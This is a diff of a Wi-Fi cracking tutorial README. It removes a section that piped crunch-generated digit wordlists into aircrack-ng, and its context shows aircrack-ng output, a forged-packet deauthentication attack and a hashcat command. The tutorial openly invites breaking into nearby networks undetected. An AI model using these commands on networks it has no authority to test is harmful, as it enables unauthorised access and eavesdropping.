@@ -4,7 +4,7 @@ Crack WPA/WPA2 Wi-Fi Routers with Airodump-ng and [Aircrack-ng](http://aircrack-
 
 This is a brief walk-through tutorial that illustrates how to crack Wi-Fi networks that are secured using weak passwords. It is not exhaustive, but it should be enough information for you to test your own network's security or break into one nearby. The attack outlined below is entirely passive (listening only, nothing is broadcast from your computer) and it is impossible to detect provided that you don't actually use the password that you crack. An optional active deauthentication attack can be used to speed up the reconnaissance process and is described at the [end of this document](#deauth-attack).
 
-If you are familiar with this process, you can skip the descriptions and jump to a list of the commands used at [the bottom](#list-of-commands).
+If you are familiar with this process, you can skip the descriptions and jump to a list of the commands used at [the bottom](#list-of-commands). For a variety of suggestions and alternative methods, see the [appendix](appendix.md).
 
 __DISCLAIMER: This software/tutorial is for educational purposes only. It should not be used for illegal activity. The author is not responsible for its use. Don't be a dick.__
 
@@ -162,86 +162,32 @@ If the password is cracked you will see a `KEY FOUND!` message in the terminal f
                          KEY FOUND! [ hacktheplanet ]
 
 
-      Master Key     : A1 90 16 62 6C B3 E2 DB BB D1 79 CB 75 D2 C7 89
-                       59 4A C9 04 67 10 66 C5 97 83 7B C3 DA 6C 29 2E
+      Master Key     : A1 90 16 62 6C B3 E2 DB BB D1 79 CB 75 D2 C7 89 
+                       59 4A C9 04 67 10 66 C5 97 83 7B C3 DA 6C 29 2E 
 
-      Transient Key  : CB 5A F8 CE 62 B2 1B F7 6F 50 C0 25 62 E9 5D 71
-                       2F 1A 26 34 DD 9F 61 F7 68 85 CC BC 0F 88 88 73
-                       6F CB 3F CC 06 0C 06 08 ED DF EC 3C D3 42 5D 78
-                       8D EC 0C EA D2 BC 8A E2 D7 D3 A2 7F 9F 1A D3 21
+      Transient Key  : CB 5A F8 CE 62 B2 1B F7 6F 50 C0 25 62 E9 5D 71 
+                       2F 1A 26 34 DD 9F 61 F7 68 85 CC BC 0F 88 88 73 
+                       6F CB 3F CC 06 0C 06 08 ED DF EC 3C D3 42 5D 78 
+                       8D EC 0C EA D2 BC 8A E2 D7 D3 A2 7F 9F 1A D3 21 
 
-      EAPOL HMAC     : 9F C6 51 57 D3 FA 99 11 9D 17 12 BA B6 DB 06 B4
+      EAPOL HMAC     : 9F C6 51 57 D3 FA 99 11 9D 17 12 BA B6 DB 06 B4 
 ```
-
-#### Cracking With Aircrack-ng combined with crunch
-
-Crunch is a tool to generate combinations of given string or pattern.We can use crunch to generate password list to avoid use of wordlist. Time required depends on your system configurations.
-
-Now, we need to install crunch
-```bash
-sudo apt-get install crunch
-```
-
-Now, use crunch with Aircrack-ng
-
-```bash
-# syntex 8 8 are min-length and max-length of password to generate
-# 01234567890 is set of elements to construct password
-# we can also use -t "@^%," to use pattern '@' - replaced with lowercase ',' - replaced with uppercase
-# '%' - replaced with numbers and '^' - is replaced with special chars
-# *************** don't forget '-' at the end
-crunch 8 8 0123456789 | aircrack-ng -a2 'PATH-TO-CAP-FILE'.cap  -b 58:98:35:CB:A2:77 -w -
-```
-
-An example to crack with 10 digit phone number using -t parameter
-```bash
-crunch 10 10 -t  "%%%%%%%%%%" | aircrack-ng -a 2 XXXXXX.cap  -b XX:XX:XX:XX:XX:XX -w -
-Crunch will now generate the following amount of data: 110000000000 bytes
-104904 MB
-102 GB
-0 TB
-0 PB
-Crunch will now generate the following number of lines: 10000000000
-Opening XXXXX.cap
-Reading packets, please wait...
-
-                                 Aircrack-ng 1.2 rc4
-
-
-                   [00:00:17] 16012 keys tested (1039.35 k/s)
-
-
-                       Current passphrase: 0000015981                 
-
-
-      Master Key     : B0 EA 2A 5B D3 81 A1 BE D0 7D E3 C3 92 03 55 51
-                       C9 5A 68 5E 3C 1D 9F 64 B5 9D 3D FA 5E A9 48 DC
-
-      Transient Key  : C0 30 AB 37 E6 CD BB 40 CE 34 56 F7 BD 13 71 3C
-                       63 77 D8 71 21 2A 7F 6F 0A 89 CE AE 70 36 46 E8
-                       C8 65 91 37 17 57 46 82 92 8B 8C 56 79 FC 0A 2A
-                       18 A0 F6 B2 3B C7 9F 86 87 6D 4D D2 08 38 8F 71
-
-      EAPOL HMAC     : AD 9B E6 04 BC 8B C5 0A 0F 72 68 CE D0 BD BC 5A
-```
-
-Everything else is same as above just dictionary file is replaced with generated passwords.
 
 ## Deauth Attack
 
-A deauth attack sends forged deauthentication packets from your machine to a client connected to the network you are trying to crack. These packets include fake "sender" addresses that make them appear to the client as if they were sent from the access point themselves. Upon receipt of such packets, most clients disconnect from the network and immediately reconnect, providing you with a 4-way handshake if you are listening with `airodump-ng`.
+A deauth attack sends forged deauthentication packets from your machine to a client connected to the network you are trying to crack. These packets include fake "sender" addresses that make them appear to the client as if they were sent from the access point themselves. Upon receipt of such packets, most clients disconnect from the network and immediately reconnect, providing you with a 4-way handshake if you are listening with `airodump-ng`. 
 
 Use `airodump-ng` to monitor a specific access point (using `-c channel --bssid MAC`) until you see a client (`STATION`) connected. A connected client look something like this, where is `64:BC:0C:48:97:F7` the client MAC.
 
 ```
  CH  6 ][ Elapsed: 2 mins ][ 2017-07-23 19:15 ]                                         
-
+                                                                                                                                           
  BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
-
+                                                                                                                                           
  9C:5C:8E:C9:AB:C0  -19  75     1043      144   10   6  54e  WPA2 CCMP   PSK  ASUS                                                         
-
+                                                                                                                                           
  BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                 
-
+                                                                                                                                           
  9C:5C:8E:C9:AB:C0  64:BC:0C:48:97:F7  -37    1e- 1e     4     6479  ASUS
 ```
 
@@ -298,8 +244,16 @@ cap2hccapx.bin capture/-01.cap capture/-01.hccapx
 HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
 ```
 
+## Appendix
+
+The response to this tutorial was so great that I've added suggestions and additional material from community members as an appendix. Check it out to learn how to:
+
+- Capture handshakes from every network around you with `wlandump-ng`
+- Use `crunch` to generate 100+GB wordlists on-the-fly
+- Spoof your MAC address with `macchanger`
+
 ## Attribution
 
 Much of the information presented here was gleaned from [Lewis Encarnacion's awesome tutorial](https://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html). Thanks also to the awesome authors and maintainers who work on Aircrack-ng and Hashcat. 
 
-Shout out to [DrinkMoreCodeMore](https://www.reddit.com/user/DrinkMoreCodeMore), [hivie7510](https://www.reddit.com/user/hivie7510), [cprogrammer1994](https://github.com/cprogrammer1994), [0XE4](https://github.com/0XE4), [hartzell](https://github.com/hartzell), [zeeshanu](https://github.com/zeeshanu), [flennic](https://github.com/flennic), [bhusang](https://github.com/bhusang), [tversteeg](https://github.com/tversteeg), [gpetrousov](https://github.com/gpetrousov), [crowchirp](https://github.com/crowchirp) and [Shark0der](https://github.com/shark0der) who also provided suggestions and typo fixes on [Reddit](https://www.reddit.com/r/hacking/comments/6p50is/crack_wpawpa2_wifi_routers_with_aircrackng_and/) and GitHub. If you are interested in hearing some proposed alternatives to WPA2, check out some of the great discussion on [this](https://news.ycombinator.com/item?id=14840539) Hacker News post.
+Shout out to [hiteshnayak305](https://github.com/hiteshnayak305), [enilfodne](https://github.com/enilfodne), [DrinkMoreCodeMore](https://www.reddit.com/user/DrinkMoreCodeMore), [hivie7510](https://www.reddit.com/user/hivie7510), [cprogrammer1994](https://github.com/cprogrammer1994), [0XE4](https://github.com/0XE4), [hartzell](https://github.com/hartzell), [zeeshanu](https://github.com/zeeshanu), [flennic](https://github.com/flennic), [bhusang](https://github.com/bhusang), [tversteeg](https://github.com/tversteeg), [gpetrousov](https://github.com/gpetrousov), [crowchirp](https://github.com/crowchirp) and [Shark0der](https://github.com/shark0der) who also provided suggestions and typo fixes on [Reddit](https://www.reddit.com/r/hacking/comments/6p50is/crack_wpawpa2_wifi_routers_with_aircrackng_and/) and GitHub. If you are interested in hearing some proposed alternatives to WPA2, check out some of the great discussion on [this](https://news.ycombinator.com/item?id=14840539) Hacker News post.
